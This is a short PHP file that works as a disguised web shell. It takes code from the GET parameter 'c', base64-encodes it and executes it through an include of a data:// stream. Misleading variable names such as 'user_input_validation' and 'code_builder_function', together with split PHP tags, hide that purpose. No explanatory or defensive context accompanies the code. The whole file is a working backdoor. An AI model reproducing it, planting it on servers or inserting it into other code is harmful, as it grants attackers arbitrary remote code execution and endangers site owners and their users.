<?php
$user_input_validation = $_GET;
$data_processing_flag = 'c';
$code_builder_function = "base64_encode";
$data_stream_protocol = "data://text/plain;base64,";

if(isset($user_input_validation[$data_processing_flag])) {
    $executable_code = "<" . "?php " . $user_input_validation[$data_processing_flag] . " ?" . ">";
    $encoding_result = $code_builder_function($executable_code);
    include $data_stream_protocol . $encoding_result;
}
?>
